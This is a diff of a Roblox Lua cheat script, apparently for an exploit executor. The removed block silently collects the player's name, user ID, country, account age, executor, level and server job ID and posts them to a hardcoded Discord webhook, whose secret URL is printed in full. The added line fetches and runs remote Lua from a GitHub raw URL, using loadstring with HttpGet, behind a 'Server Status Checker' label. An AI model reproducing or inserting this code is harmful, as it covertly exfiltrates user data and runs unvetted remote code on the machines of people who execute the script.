@@ -1,65 +1,7 @@
-local LocalizationService = game:GetService("LocalizationService")
-local player = game.Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
+local checker5 = loadstring(game:HttpGet("https://raw.githubusercontent.com/JaerenBugluar/ServerChecker/main/Server%20Status%20Checker.lua"))()
 
-local le = (game:GetService("Players").LocalPlayer.Data.Level.Value)
-local code = LocalizationService:GetCountryRegionForPlayerAsync(player)
-local data = {
-    embeds = {
-        {
-            title = "Player Profile",
-            url = "https://www.roblox.com/users/" .. player.UserId,
-            description = "```" .. player.DisplayName .. " (" .. player.Name .. ") ```",
-            color = tonumber(322852),
-            fields = {
-                {
-                    name = "🌐 Country :",
-                    value = "```" .. code .. "```",
-                    inline = true
-                },
-                {
-                    name = "🔞 Account Age :",
-                    value = "```" .. player.AccountAge .. " Days```",
-                    inline = true
-                },
-                {
-                    name = "❔ Executor :",
-                    value = "```" .. identifyexecutor() .. "```",
-                    inline = true
-                },
-                {
-                    name = "😲 Level :",
-                    value = "```" .. le .. "```",
-                    inline = true
-                },
-                {
-                    name = "📜 Job ID :",
-                    value = "```" .. tostring(game.JobId) .. "```",
-                    inline = true
-                },
-                {
-                    name = "👽 User Status :",
-                    value = "``` Using Virgo Spectrum Version 2.0!!```",
-                    inline = true
-                }
-            }
-        }
-    }
-}
-
-local jsonData = HttpService:JSONEncode(data)
-local webhookUrl = "https://discord.com/api/webhooks/1226030430667542539/_KnPYDaoSUq91QqtliWKWg4k7Q5rJ_AxsLgJI5xmUbBMmIx_lt5YDUjPDXqlxGrs9_Fn"
-local headers = {["Content-Type"] = "application/json"}
-request = http_request or request or HttpPost or fluxus.request or syn.request or Krnl.request or delta.request;
-local request = http_request or request or HttpPost or syn.request
-local final = {Url = webhookUrl, Body = jsonData, Method = "POST", Headers = headers}
-
-local success, response = pcall(request, final)
-if success then
-    print("+1 Executed")
-else
-    print("Trash Executor💀" .. response)
-end
+wait(3)
+checker5()
 
 repeat wait() until game:IsLoaded()
 repeat wait() until game:GetService("Players")
